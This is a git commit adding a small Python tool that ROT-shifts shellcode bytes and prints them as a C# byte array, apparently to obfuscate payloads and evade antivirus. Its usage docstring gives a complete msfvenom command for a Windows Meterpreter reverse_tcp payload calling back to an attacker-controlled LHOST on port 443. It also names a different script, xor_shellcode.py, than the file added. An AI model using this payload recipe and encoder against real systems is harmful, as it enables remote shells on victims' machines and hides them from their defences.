df8eba920c7c58356f9fe7e9d0e9e61dca54171d
Yek Tham <yek3y.ht@gmail.com>
2023-07-03 16:49:02 +1200

    added python rot encoder

---
+++ general_encoders/rot_shellcode.py
@@ -0,0 +1,20 @@
+#!/usr/bin/env python3
+import sys
+
+''' Usage:
+    ./rot_shellcode.py <msfvenom_ps1_payload>
+    Example:
+    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.49.67 LPORT=443 -e x64/xor_dynamic -b '\\x00\\x0a\\x0d' EXITFUNC=thread -f ps1
+    [Byte[]] $buf = 0xfc,0x48,...,0xff,0xd5
+    ./xor_shellcode.py 0xfc,0x48,...,0xff,0xd5
+'''
+
+buf = sys.argv[1].split(',') or None
+rot = 5
+
+# int to hexstring; prefix 0x; pad 4 chars
+buf = [f'{(int(x, 0) + rot) & 0xFF:#04x}' for x in buf]
+
+# wrap every 12th character
+res = [f'\n{ele}' if idx % 12 == 0 else ele for idx, ele in enumerate(buf)]
+print(f'\nROT with {rot}:\nbyte[] buf = new byte[{len(buf)}] {{{",".join(res)}}};')
